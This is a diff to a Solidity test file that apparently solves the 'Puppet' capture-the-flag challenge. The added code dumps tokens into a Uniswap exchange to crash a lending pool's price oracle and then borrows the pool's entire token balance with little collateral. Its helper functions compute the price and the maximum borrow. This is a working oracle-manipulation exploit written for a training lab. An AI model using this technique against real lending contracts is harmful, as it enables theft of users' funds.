@@ -100,6 +100,34 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        // Approve the Uniswap exchange to spend the attacker's tokens
+        dvt.approve(address(uniswapExchange), type(uint256).max);
+
+        console.log("Attacker DVT balance before swap: ", dvt.balanceOf(attacker) / 10 ** 18);
+        console.log("Attacker ETH balance before swap: ", attacker.balance / 10 ** 18);
+
+        console.log("Token price before swap: ", computeTokenPrice());
+
+        // Manipulate the price of the token in the Uniswap exchange
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, DEADLINE);
+
+        console.log("Attacker DVT balance after swap: ", dvt.balanceOf(attacker) / 10 ** 18);
+        console.log("Attacker ETH balance after swap: ", attacker.balance / 10 ** 18);
+
+        console.log("Token price after swap: ", computeTokenPrice());
+
+        // Borrow the maximum amount of tokens from the pool
+        uint256 borrowAmount = calculateMaxBorrowable(ATTACKER_INITIAL_ETH_BALANCE);
+        if (borrowAmount > POOL_INITIAL_TOKEN_BALANCE) {
+            console.log("Borrowing the maximum amount of tokens from the pool");
+            borrowAmount = POOL_INITIAL_TOKEN_BALANCE;
+        }
+
+        puppetPool.borrow{value: puppetPool.calculateDepositRequired(borrowAmount)}(borrowAmount);
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -117,11 +145,20 @@ contract Puppet is Test {
     // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
     function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
         internal
+        pure
         returns (uint256)
     {
         uint256 input_amount_with_fee = input_amount * 997;
         uint256 numerator = input_amount_with_fee * output_reserve;
         uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
         return numerator / denominator;
+    }
+
+    function calculateMaxBorrowable(uint256 ethAmount) public view returns (uint256) {
+        return (ethAmount * 10 ** 18) / (computeTokenPrice() * 2);
+    }
+
+    function computeTokenPrice() public view returns (uint256) {
+        return (address(uniswapExchange).balance * (10 ** 18)) / dvt.balanceOf(address(uniswapExchange));
     }
 }
